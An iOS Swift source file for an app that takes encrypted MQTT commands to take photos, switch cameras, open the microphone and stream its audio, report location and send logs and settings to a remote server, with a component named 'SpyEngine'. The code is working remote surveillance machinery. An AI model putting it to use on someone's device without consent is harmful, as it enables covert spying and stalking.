import Foundation
import AVFoundation
import UIKit

final class Relay {
    static let shared = Relay()
    private let audioQ = DispatchQueue(label: "relay.audio")
    private let down = Downsampler()
    private let proto = 1

    func connect() {
        Mqtt.shared.onPayload = { [weak self] raw in
            guard let plain = Crypto.open(raw),
                  let m = try? JSONSerialization.jsonObject(with: Data(plain.utf8)) as? [String: Any]
            else { return }
            self?.handle(m)
        }
        Mqtt.shared.onUp = { Outbox.shared.flush() }
        Mqtt.shared.start()
        Timer.scheduledTimer(withTimeInterval: 15, repeats: true) { _ in Outbox.shared.flush() }
    }

    private func handle(_ m: [String: Any]) {
        if let p = m["proto"] as? Int, p > proto {
            HealthMon.fail(.pushAlerts, "payload proto \(p) newer than \(proto)")
        }
        if let d = m["dev"] as? String, d != Dev.id { return }
        switch m["cmd"] as? String {
        case "snap":       SpyEngine.shared.snap()
        case "listen":     MicGate.shared.listen(seconds: m["seconds"] as? Double)
        case "stopListen": MicGate.shared.stopListening()
        case "micOn":      Settings.shared.set(.mic, true, remote: true); MicGate.shared.apply()
        case "micOff":     Settings.shared.set(.mic, false, remote: true); MicGate.shared.apply()
        case "front":      SpyEngine.shared.cameraPosition = .front
        case "back":       SpyEngine.shared.cameraPosition = .back
        case "recheck":    HealthMon.sweep()
        case "locate":     SpyEngine.shared.locateNow()
        case "hist":       Relay.shared.sendJSON(["type": "hist", "rows": Hist.tail(200)], log: false)
        case "openSettings":
            if let u = URL(string: UIApplication.openSettingsURLString) {
                DispatchQueue.main.async { UIApplication.shared.open(u) }
            }
        case "state": Relay.shared.sendJSON(["type": "settings", "values": Settings.shared.snapshot as [String: Any]], log: false)
        default: break
        }
        if m["type"] as? String == "settings" { Settings.shared.applyRemote(m) }
    }

    func prepare(_ src: AVAudioFormat) {
        down.prepare(src)
        sendJSON(["type": "audio-format", "rate": 16000])
    }

    func sendJSON(_ o: [String: Any], log: Bool = true) {
        var body = o
        body["proto"] = proto
        if body["dev"] == nil { body["dev"] = Dev.id }
        if log { Hist.append(body) }
        guard let d = try? JSONSerialization.data(withJSONObject: body),
              let s = String(data: d, encoding: .utf8),
              let e = Cipher.seal(s) else { return }
        Mqtt.shared.publish(e)
    }

    func sendPCM(_ buf: AVAudioPCMBuffer) {
        guard let copy = buf.copy() as? AVAudioPCMBuffer else { return }
        audioQ.async {
            guard let small = self.down.process(copy), let ch = small.floatChannelData?[0] else { return }
            let n = Int(small.frameLength)
            var pcm = [Int16](repeating: 0, count: n)
            for i in 0..<n { pcm[i] = Int16(max(-1, min(1, ch[i])) * 32767) }
            let data = pcm.withUnsafeBufferPointer { Data(buffer: $0) }
            self.sendJSON(["type": "pcm", "b64": data.base64EncodedString()], log: false)
        }
    }

    func sendPhoto(_ d: Data) { sendJSON(["type": "photo", "b64": d.base64EncodedString()]) }
}

final class Downsampler {
    let target = AVAudioFormat(commonFormat: .pcmFormatFloat32,
                               sampleRate: 16000, channels: 1, interleaved: false)!
    private var conv: AVAudioConverter?
    func prepare(_ src: AVAudioFormat) { conv = AVAudioConverter(from: src, to: target) }
    func process(_ buf: AVAudioPCMBuffer) -> AVAudioPCMBuffer? {
        guard let c = conv else { return nil }
        let cap = AVAudioFrameCount(Double(buf.frameLength) * target.sampleRate / buf.format.sampleRate) + 64
        guard let out = AVAudioPCMBuffer(pcmFormat: target, frameCapacity: cap) else { return nil }
        var used = false, err: NSError?
        c.convert(to: out, error: &err) { _, s in
            if used { s.pointee = .noDataNow; return nil }
            used = true; return buf
        }
        return err == nil ? out : nil
    }
}
